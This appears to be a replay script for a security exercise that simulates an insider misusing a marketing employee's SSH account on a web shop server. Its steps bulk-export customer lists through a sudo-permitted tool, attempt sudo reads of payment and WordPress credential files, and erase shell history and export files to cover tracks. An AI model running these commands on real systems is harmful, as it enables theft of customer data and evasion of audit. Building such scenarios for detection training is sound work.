notes: Terminal sessions with typed commands, held open for some minutes, as a person's are. The evidence grows in steps: quiet (the tool and list that Mia uses, from a new address), stronger (+600: an old key that Mia never uses, from a second address, while Mia herself is logged in from home; a second list (one that she also pulls on some days) in the history), loud (+760: sudo refusals for files marketing has no reason to read; +900: all customers through the support look-up mode). At +1060 the intruder removes what its account can remove: the export files and the shell history. The system logs stay.

steps.label: first login as Mia (password); ordinary look
steps.run: (sleep 3; printf '%s\n' 'tail -n 20 /var/log/nginx/larkspur.access.log'; sleep 40; printf '%s\n' 'exit'; sleep 1) | SSHPASS='{secret:password}' sshpass -e ssh -tt -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 mfischer@{target} > /dev/null

steps.label: quiet: password login; export the newsletter list, as Mia does
steps.run:
(sleep 3; printf '%s
' 'echo "list newsletter" | sudo -n /usr/local/sbin/larkspur-mailing-export'; sleep 6; printf '%s
' 'cat "$(ls -t ~/newsletter-*.csv | head -1)"'; sleep 150; printf '%s
' 'exit'; sleep 1) | SSHPASS='{secret:password}' sshpass -e ssh -tt -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 mfischer@{target} > /root/.replay/l-newsletter.txt; grep -q '^[0-9][0-9]*,' /root/.replay/l-newsletter.txt

steps.label: quiet: password login; look at what the account can do
steps.run:
(sleep 3; printf '%s
' 'id'; sleep 4; printf '%s
' 'sudo -n -l'; sleep 8; printf '%s
' 'ls -la ~'; sleep 70; printf '%s
' 'exit'; sleep 1) | SSHPASS='{secret:password}' sshpass -e ssh -tt -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 mfischer@{target} > /dev/null

steps.label: stronger: old key login from a second address while Mia is logged in from home; export a second list
steps.run:
(sleep 3; printf '%s
' 'echo "list recent" | sudo -n /usr/local/sbin/larkspur-mailing-export'; sleep 6; printf '%s
' 'cat "$(ls -t ~/recent-*.csv | head -1)"'; sleep 130; printf '%s
' 'exit'; sleep 1) | ssh -tt -i /root/.replay/k1 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mfischer@{target} > /root/.replay/l-recent.txt; grep -q '^[0-9][0-9]*,' /root/.replay/l-recent.txt

steps.label: loud: tries to read the payment settings and the site settings with sudo (refused)
steps.run:
(sleep 3; printf '%s
' 'sudo cat /etc/larkspur/payments.ini'; sleep 3; printf '%s
' '{secret:password}'; sleep 6; printf '%s
' 'sudo cat /var/www/larkspur/wp-config.php'; sleep 6; printf '%s
' 'ls /etc/larkspur'; sleep 40; printf '%s
' 'exit'; sleep 1) | ssh -tt -i /root/.replay/k1 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mfischer@{target} > /dev/null

steps.label: loud: all customers with the support look-up mode of the export tool
steps.run:
(sleep 3; printf '%s
' 'echo "ids 1-99999" | sudo -n /usr/local/sbin/larkspur-mailing-export'; sleep 8; printf '%s
' 'cat "$(ls -t ~/customers-*.csv | head -1)"'; sleep 90; printf '%s
' 'exit'; sleep 1) | ssh -tt -i /root/.replay/k1 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mfischer@{target} > /root/.replay/l-all.txt; grep -q '^[0-9][0-9]*,' /root/.replay/l-all.txt

steps.label: cover: remove the export files of the shift and the shell history
steps.run:
(sleep 3; printf '%s
' 'unset HISTFILE'; sleep 2; printf '%s
' 'find ~ -maxdepth 1 -name "*.csv" -mmin -25 -delete'; sleep 3; printf '%s
' 'rm -f ~/.bash_history'; sleep 20; printf '%s
' 'exit'; sleep 1) | ssh -tt -i /root/.replay/k1 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no mfischer@{target} > /dev/null
